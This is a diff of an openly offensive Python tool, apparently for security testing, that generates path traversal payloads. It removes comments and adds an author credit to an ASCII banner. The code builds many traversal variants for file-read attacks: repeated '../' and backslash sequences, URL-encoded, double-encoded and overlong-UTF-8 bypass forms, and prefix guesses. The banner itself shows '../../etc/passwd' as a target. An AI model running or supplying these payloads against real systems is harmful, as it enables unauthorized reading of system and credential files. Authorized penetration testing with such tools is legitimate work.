@@ -4,40 +4,37 @@ import sys
 from colorama import Fore, Style, init
 import signal
 
-# Initialize Colorama for cross-platform color support
+# Initialize Colorama
 init()
 
-# Function to handle program interruptions gracefully
 def handle_exit(signal_received, frame):
     print(f"\n{Fore.RED}Program interrupted. Exiting gracefully...{Style.RESET_ALL}")
     sys.exit(0)
 
-# Register the signal handler for interrupt signals
 signal.signal(signal.SIGINT, handle_exit)
 
 def generate_traversal_payloads(target_file):
-    # Different traversal depths and non-traversal variations
+    # Different traversal depths 
     traversal_depths = ["../" * i for i in range(1, 10)] + ["..\\"] * 10 + ["\\..\\"] * 10 + ["|../" * i for i in range(1, 5)]
     
-    # Split the target file path into segments
+
     path_segments = target_file.strip('/').split('/')
     
-    # Ensure there are enough segments to avoid index errors
     if len(path_segments) < 1:
         print(f"{Fore.RED}Error: The target file path must contain at least one segment.{Style.RESET_ALL}")
         return []
 
-    # Generate more payloads using the path segments
+  
     segment_payloads = [segment for segment in path_segments]
     
-    # Additional patterns for bypass techniques
+
     traversal_patterns = [
         "{depth}{file}", "{depth}/{file}", "{depth}\\/{file}", "{depth}\\{file}", "{depth}//{file}", "{depth}\\..\\{file}",
         "{depth}/%2e%2e/{file}", "{depth}%5c%2e%2e%5c{file}", "{depth}%5c{file}", "{depth}%252e%252e%252f{file}",
         "{depth}%5c%2e%2e/{file}", "{depth}%c0%af{file}", "{depth}%c1%9c/{file}"
     ]
 
-    # Additional payloads without ".", "/", or "\"
+
     additional_payloads = [
         f"secret/{target_file}", f"hidden{target_file}", f"config{target_file}", f"admin{target_file}", 
         f"private{target_file}", f"data{target_file}", f"backup{target_file}", f"temp{target_file}"
@@ -62,19 +59,19 @@ def generate_traversal_payloads(target_file):
             payload_with_encoded_depth = pattern.format(depth=encoded_depth, file=encoded_file)
             payloads.add(payload_with_encoded_depth)
 
-    # Adding additional payloads with encoded prefix
+   
     for encode_file in file_encodings:
         encoded_file = encode_file(target_file)
         for add_payload in additional_payloads:
             encoded_add_payload = encode_file(add_payload)
             payloads.add(encoded_add_payload)
 
-    # New variations avoiding "/", "\", and "."
+  
     no_slash_dot_payloads = [
         f"|{segment}" for segment in segment_payloads
     ]
 
-    # Variants with file extensions using the path segments
+    
     file_extension_payloads = []
     if len(path_segments) >= 3:
         file_extension_payloads += [
@@ -105,8 +102,8 @@ def display_ascii_art():
     ascii_art = f"""
 {Fore.LIGHTMAGENTA_EX}{Style.BRIGHT}
      ______________
-    |              |=-| =%2e%2e%2F%2e%2e%2F%2e%2e%2F{Fore.RESET}{Fore.BLUE}{Style.BRIGHT}
-    |  PATH TRAV   |=-| =../../etc/passwd{Fore.RESET}{Fore.LIGHTGREEN_EX}
+    |              |=-| =%2e%2e%2F%2e%2e%2F%2e%2e%2F{Fore.RESET}{Fore.BLUE}{Style.BRIGHT} by Bohdan Misonh
+    |  PATH TRAV   |=-| =../../etc/passwd{Fore.RESET}{Fore.LIGHTGREEN_EX} version 1.0
     |   GENERATOR  |=-| ..//home//carlos//secret
     |______________|{Fore.RESET}
     (\\__/) ||
@@ -134,4 +131,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
